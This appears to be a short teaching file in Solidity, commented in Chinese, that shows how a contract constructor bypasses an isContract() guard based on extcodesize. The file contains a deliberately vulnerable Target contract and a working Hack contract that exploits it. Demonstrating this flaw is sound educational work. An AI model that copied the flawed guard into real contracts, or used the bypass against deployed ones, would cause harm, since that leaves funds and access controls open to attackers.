// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Target {
    function isContract(address account) public view returns (bool) {
        // 该方法依赖于extcodesize函数，
        //对于正在构建中的合约，该函数返回0，
        //因为代码只在构造函数执行结束时存储。
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // 尝试调用Target.protected将失败，
    // Target阻止从合约调用
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // 当合约正在创建时，代码大小（extcodesize）为0。
    // 这将绕过isContract()检查
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // 这将起作用
        Target(_target).protected();
    }
}